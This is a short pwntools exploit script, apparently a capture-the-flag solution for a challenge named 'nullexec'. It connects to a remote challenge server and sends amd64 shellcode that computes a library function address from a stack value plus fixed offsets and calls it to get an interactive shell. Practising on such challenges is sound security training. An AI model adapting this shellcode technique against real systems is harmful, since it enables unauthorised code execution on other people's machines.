from pwn import *

context.arch = "amd64"

#io = process("./nullexec_patched")
io = remote("0.cloud.chals.io", 31288)

shellcode = """
    mov rax, [rsp + 0x20]
    add rax, 0x26fe0
    mov rdi, rax
    add rdi, 0x187908
    add rsp, 8
    call rax
"""

shellcode = asm(shellcode)

input("PAUSE")
io.sendline(shellcode)

io.interactive()
